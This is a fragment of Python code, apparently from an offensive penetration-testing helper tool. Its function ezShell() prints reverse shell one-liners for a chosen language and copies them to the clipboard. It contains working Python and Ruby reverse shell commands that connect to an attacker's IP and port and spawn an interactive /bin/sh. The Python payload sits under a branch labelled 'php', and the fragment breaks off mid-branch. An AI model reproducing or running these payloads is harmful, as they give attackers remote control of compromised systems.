...
def ezShell():
    if language == "php":
        ...
        pyperclip.copy(
            f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attackerIP}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''
        )
    elif language == "ruby":
        print(
            f'[+] Ruby Reverse shell:\n ruby -rsocket -e\'f=TCPSocket.open("{attackerIP}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        )
        pyperclip.copy(
            f'ruby -rsocket -e\'f=TCPSocket.open("{attackerIP}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
        )
    elif language == "nce":
